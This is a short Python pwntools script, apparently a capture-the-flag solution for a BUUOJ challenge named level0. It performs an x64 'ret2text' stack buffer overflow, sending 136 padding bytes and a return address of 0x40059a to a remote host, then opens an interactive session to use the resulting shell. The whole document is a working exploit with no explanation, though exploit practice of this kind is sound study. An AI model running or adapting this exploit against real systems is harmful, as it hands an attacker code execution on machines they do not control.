#Made by fly_autumn
#x64 ret2text
from pwn import *
#p = process("./level0")
p = remote("node6.buuoj.cn",26624)
elf = ELF("./level0")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
context(os="linux",arch="amd64")

offset = 136
func_plt = 0x40059a
payload = b"\x00" * offset + p64(func_plt)
p.sendline(payload)

p.interactive()
